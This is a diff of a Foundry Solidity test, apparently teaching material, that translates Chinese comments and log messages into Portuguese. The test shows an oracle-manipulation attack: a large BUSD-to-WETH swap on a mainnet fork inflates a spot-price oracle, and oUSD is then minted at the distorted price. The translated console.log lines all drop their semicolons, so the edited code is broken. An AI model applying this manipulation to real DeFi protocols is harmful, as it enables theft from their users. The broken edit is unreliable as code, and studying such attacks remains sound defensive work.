@@ -17,35 +17,35 @@ contract OracleTest is Test {
 
     function setUp() public {
         MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
-        // fork指定区块
+        // fork especifica um bloco
         vm.createSelectFork(MAINNET_RPC_URL,16060405);
         router = IUniswapV2Router(ROUTER);
         ousd = new oUSD();
     }
 
-    //forge test --match-test  testOracleAttack  -vv
+    //forge test --match-test testOracleAttack -vv
     function testOracleAttack() public {
-        // 攻击预言机
-        // 0. 操纵预言机之前的价格
+        // Ataque ao oráculo
+        // 0. Preço antes de manipular o oráculo
         uint256 priceBefore = ousd.getPrice();
-        console.log("1. ETH Price (before attack): %s", priceBefore); 
-        // 给自己账户 1000000 BUSD
+        console.log("1. Preço do ETH (antes do ataque): %s", priceBefore)
+        // Dê 1000000 BUSD para a sua conta
         uint busdAmount = 1_000_000 * 10e18;
         deal(BUSD, alice, busdAmount);
-        // 2. 用busd买weth，推高顺时价格
+        // 2. Compre WETH com BUSD para impulsionar o preço em alta.
         vm.prank(alice);
         busd.transfer(address(this), busdAmount);
         swapBUSDtoWETH(busdAmount, 1);
-        console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
-        // 3. 操纵预言机之后的价格
+        console.log("2. Troque 1.000.000 BUSD por WETH para manipular o oráculo")
+        // 3. Preços após a manipulação do oráculo
         uint256 priceAfter = ousd.getPrice();
-        console.log("3. ETH price (after attack): %s", priceAfter); 
-        // 4. 铸造oUSD
+        console.log("3. Preço do ETH (após o ataque): %s", priceAfter)
+        // 4. Fundição de oUSD
         ousd.swap{value: 1 ether}();
-        console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18); 
+        console.log("4. Cunhou %s oUSD com 1 ETH (após o ataque)", ousd.balanceOf(address(this))/10e18)
     }
 
-    // Swap BUSD to WETH
+    // Trocar BUSD por WETH
     function swapBUSDtoWETH(uint amountIn, uint amountOutMin)
         public
         returns (uint amountOut)
@@ -65,7 +65,7 @@ contract OracleTest is Test {
             block.timestamp
         );
 
-        // amounts[0] = BUSD amount, amounts[1] = WETH amount
+        // amounts[0] = valor BUSD, amounts[1] = valor WETH
         return amounts[1];
     }
 }
